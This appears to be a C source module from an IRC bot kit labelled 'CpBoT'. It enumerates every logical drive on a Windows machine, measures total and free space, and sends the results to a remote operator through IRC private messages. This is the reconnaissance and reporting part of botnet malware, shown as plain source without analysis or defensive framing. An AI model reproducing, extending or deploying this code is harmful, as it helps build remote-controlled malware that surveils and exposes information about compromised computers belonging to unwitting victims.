//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//


#include "includes.h"
#include "functions.h"

#ifndef NO_DRIVEINFO

const char *DriveType(LPCSTR Drive)
{
	switch(GetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}


DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;
#ifndef _DEBUG
	fSetErrorMode(SEM_FAILCRITICALERRORS);// So drive does not ask for disk
#endif
	GetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);
#ifndef _DEBUG
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif
	return (dksp);
}

DKSPN DiskSpaceN(LPCSTR Drive,int Size,char *SizeChr)
{
	DKSPN dkspn;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspn.Available, "failed");
		sprintf(dkspn.Free, "failed");
		sprintf(dkspn.Total, "failed");
	} else {
		_snprintf(dkspn.Available,sizeof(dkspn.Available),"%s%s",commaI64(dksp.AvailableBytes/Size),SizeChr);
		_snprintf(dkspn.Free,sizeof(dkspn.Free),"%s%s",commaI64(dksp.FreeBytes/Size),SizeChr);
		_snprintf(dkspn.Total,sizeof(dkspn.Total),"%s%s",commaI64(dksp.TotalBytes/Size),SizeChr);
	}

	return (dkspn);
}

DKSPT DiskSpaceTotal(LPCSTR Drive,int Size)
{
	DKSPT dkspt;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 && dksp.FreeBytes == -1 && dksp.TotalBytes == -1) {
		dkspt.AvailableT=0;
		dkspt.FreeT=0;
		dkspt.TotalT=0;
	} else {
		dkspt.AvailableT=dksp.AvailableBytes/Size;
		dkspt.FreeT=dksp.FreeBytes/Size;
		dkspt.TotalT=dksp.TotalBytes/Size;
	}

	return (dkspt);
}

void DriveSpaceN(char *target, void *conn, LPCSTR Drive, int Size, char *SizeChr)
{
	IRC* irc=(IRC*)conn;
	DKSPN dkspn=DiskSpaceN(Drive,Size,SizeChr);

	if (!strcmp(dkspn.Total,"failed"))
		irc->privmsg(target,"%s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		irc->privmsg(target,"%s Drive (%s), total: %s, free: %s, available: %s.", DriveType(Drive), Drive, dkspn.Total, dkspn.Free, dkspn.Available);
	return;
}

void DriveInfoTotal(char *target, void *conn, int Size, char *SizeChr)
{
	IRC* irc=(IRC*)conn;
	__int64 tmpAvail=0;
	__int64 tmpFree=0;
	__int64 tmpTotal=0;
	
	DWORD dwSize = GetLogicalDriveStrings(0, NULL);
	LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
	GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
	LPCTSTR pszDrv = pszDrives;
	while (*pszDrv) {
		if (strcmp(pszDrv,"A:\\") != 0) {
			DKSPT dkspt;
			dkspt=DiskSpaceTotal(pszDrv, Size);
			tmpAvail+=dkspt.AvailableT;
			tmpFree+=dkspt.FreeT;
			tmpTotal+=dkspt.TotalT;
		}
		pszDrv += _tcslen (pszDrv) + 1;
	}
	free(pszDrives);
	
	char cAvail[50],cFree[50],cTotal[50];
	irc->privmsg(target,"Drive Totals (N/A), total: %s%s, free: %s%s, available: %s%s.",
		commaI64(tmpTotal,cTotal), SizeChr, commaI64(tmpFree,cFree), SizeChr, commaI64(tmpAvail,cAvail), SizeChr);
	return;
}
DKSPT DriveInfoL(int Size, char *SizeChr, LPCSTR Drive)
{	
	DKSPT dksptr;
	dksptr.AvailableT=0;
	dksptr.FreeT=0;
	dksptr.TotalT=0;
	
	if (Drive != 0) {
		DKSPT dkspt;
		dkspt=DiskSpaceTotal(Drive, Size);
		dksptr.AvailableT+=dkspt.AvailableT;
		dksptr.FreeT+=dkspt.FreeT;
		dksptr.TotalT+=dkspt.TotalT;
		return (dksptr);
	}
	
	if (Drive == 0) {
		DWORD dwSize = GetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0) {
				DKSPT dkspt;
				dkspt=DiskSpaceTotal(pszDrv, Size);
				dksptr.AvailableT+=dkspt.AvailableT;
				dksptr.FreeT+=dkspt.FreeT;
				dksptr.TotalT+=dkspt.TotalT;
			}
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return (dksptr);
}

void DriveInfo(char *target, void *conn, LPCSTR Drive, BOOL mb, BOOL gb, BOOL silent)
{
	IRC* irc=(IRC*)conn;
	if (Drive) {
		if (!mb && !gb)		DriveSpaceN(target,conn,Drive,1024,"KB");
		else if (mb && !gb)	DriveSpaceN(target,conn,Drive,1048576,"MB");
		else if (!mb && gb) DriveSpaceN(target,conn,Drive,1073741824,"GB");
	} else {
		DWORD dwSize = GetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		if (!silent)
			irc->privmsg(target,"%s Listing drives:",drives_title);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {			
			if (strcmp(pszDrv,"A:\\") != 0) {
				if (!mb && !gb)		DriveSpaceN(target,conn,pszDrv,1024,"KB");
				else if (mb && !gb)	DriveSpaceN(target,conn,pszDrv,1048576,"MB");
				else if (!mb && gb) DriveSpaceN(target,conn,pszDrv,1073741824,"GB");
			}
			pszDrv += _tcslen (pszDrv) + 1;
		}
		if (!mb && !gb)		DriveInfoTotal(target,conn,1024,"KB");
		else if (mb && !gb)	DriveInfoTotal(target,conn,1048576,"MB");
		else if (!mb && gb) DriveInfoTotal(target,conn,1073741824,"GB");
		
		if (!silent)
			irc->privmsg(target,"%s End of list.",drives_title);
		
		free(pszDrives);
	}
	
//	addlogv(MAINLOG,"%s Displayed drive list: %s, %s.", drives_title,(Drive?Drive:"All Drives"), (mb?"MB": (gb?"GB":"KB") ) );
	return;
}

DWORD WINAPI DriveThread(LPVOID param) {
	NTHREAD dinfo = *((NTHREAD *)param);
	NTHREAD *dinfos = (NTHREAD *)param;
	dinfos->gotinfo = TRUE;

	DriveInfo(dinfo.target,dinfo.conn,dinfo.data1, dinfo.bdata1, dinfo.bdata2, dinfo.silent);

	clearthread(dinfo.threadnum);
	return 0;

}
#endif